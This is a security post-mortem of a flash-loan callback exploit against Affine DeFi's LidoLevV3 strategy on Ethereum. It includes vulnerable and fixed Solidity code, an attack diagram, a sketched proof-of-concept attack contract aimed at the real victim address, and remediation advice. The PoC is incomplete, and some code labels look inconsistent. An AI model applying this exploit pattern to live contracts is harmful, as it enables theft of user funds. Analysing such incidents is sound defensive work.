# Affine DeFi (LidoLevV3) — Flash Loan Callback Exploitation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-01 |
| **Protocol** | Affine DeFi (LidoLevV3) |
| **Chain** | Ethereum |
| **Loss** | ~33 aEthwstETH |
| **Attacker** | [0x09f6be2a](https://etherscan.io/address/0x09f6be2a7d0d2789f01ddfaf04d4eaa94efc0857) |
| **Attack Contract** | [0x12d85e58](https://etherscan.io/address/0x12d85e5869258a80d4bebe70d176d0f58b2d68e4) |
| **Vulnerable Contract** | [LidoLevV3 0xcd6ca2f0](https://etherscan.io/address/0xcd6ca2f0d0c182c5049d9a1f65cde51a706ae142) |
| **Root Cause** | LidoLevV3's `receiveFlashLoan` callback does not validate the caller (msg.sender), allowing arbitrary triggering to manipulate internal state |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/AffineDeFi_exp.sol) |

---

## 1. Vulnerability Overview

Affine DeFi's LidoLevV3 strategy contract uses Balancer flash loans for leverage position management. The `receiveFlashLoan` callback function does not validate that only the Balancer Vault may call it, allowing an attacker to trigger a 0 WETH flash loan to manipulate internal state and drain aEthwstETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no callback caller validation
function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // Does not verify that msg.sender is the Balancer Vault
    // Attacker can call this directly
    _processCallback(tokens, amounts, userData);
}

// ✅ Safe code: callback caller + initiator validation
address immutable balancerVault;

function receiveFlashLoan(...) external {
    require(msg.sender == balancerVault, "not balancer vault");
    require(_flashLoanInitiator == address(this), "not self-initiated");
    _processCallback(tokens, amounts, userData);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: LidoLevEthStrategy.sol
contract LidoLevEthStrategy is LidoLevV3 {
    constructor(AffineVault _vault, address[] memory strategists) LidoLevV3(_vault, strategists) {}  // ❌ vulnerability
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] First Balancer flash loan with callback data type 1
  │         └─ Large WETH (318,973,831...)
  │
  ├─→ [2] receiveFlashLoan callback (type 1)
  │         └─ Internal state manipulation — aEthwstETH balance manipulation
  │
  ├─→ [3] Second Balancer flash loan with callback data type 2
  │         └─ 0 WETH (callback trigger only)
  │
  ├─→ [4] receiveFlashLoan callback (type 2)
  │         └─ Withdraw aEthwstETH using manipulated state
  │
  └─→ [5] ~33 aEthwstETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ILidoLevV3 {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancer {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract AttackContract {
    ILidoLevV3 constant victim   = ILidoLevV3(0xcd6ca2f0d0c182c5049d9a1f65cde51a706ae142);
    IBalancer  constant balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function testExploit() external {
        // [1] First flash loan (type 1 callback data)
        bytes memory callbackData1 = abi.encode(uint256(1));
        balancer.flashLoan(this, wethTokens, largeAmounts, callbackData1);

        // [2] Second flash loan (type 2, 0 WETH)
        bytes memory callbackData2 = abi.encode(uint256(2));
        balancer.flashLoan(this, wethTokens, zeroAmounts, callbackData2);
    }

    function receiveFlashLoan(
        IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory userData
    ) external {
        uint256 callType = abi.decode(userData, (uint256));
        if (callType == 1) {
            // Manipulate internal state
            manipulateState();
        } else {
            // Withdraw aEthwstETH
            withdrawAethwstETH();
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan callback validation missing |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct callback invocation) |
| **DApp Category** | Leveraged staking strategy |
| **Impact** | Theft of strategy contract funds |

## 6. Remediation Recommendations

1. **Callback caller validation**: Must verify `msg.sender == balancerVault`
2. **Self-initiated validation**: Use a flag to confirm the flash loan was initiated by the contract itself
3. **Single entry-point pattern**: Handle flash loan initiation and callback only within the same function flow
4. **State reset**: Snapshot state before callback processing and revert on abnormal changes

## 7. Lessons Learned

- Flash loan callbacks must always validate both `msg.sender` and `initiator`.
- A 0 WETH flash loan still triggers the callback, so amount-based validation alone is insufficient.
- Leveraged strategy contracts are particularly sensitive to internal state manipulation and therefore require strict callback security.